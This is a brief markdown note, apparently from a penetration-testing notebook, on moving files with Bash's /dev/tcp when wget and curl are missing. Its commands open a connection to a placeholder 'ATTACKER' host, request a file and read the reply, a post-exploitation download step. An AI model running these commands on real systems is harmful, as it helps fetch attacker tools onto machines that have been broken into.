- If stuff like `wget` and `curl` are unavailable, Bash can make TCP connections through `/dev/tcp` when supported.

---

## The way To Do it From Our Machin

```bash
# Connect to the Target Webserver 
exec 3<>/dev/tcp/ATTACKER/80
```

```bash
# Send a HTTP GET Request and specify the file name or its loc
echo -e "GET /file HTTP/1.1\n\n" >&3
```

```BASH
# Read The response
cat <&3
```

---

## File Transfer using Netcat / Ncat 

- Refer here [[Nc & Ncat File Transfer]]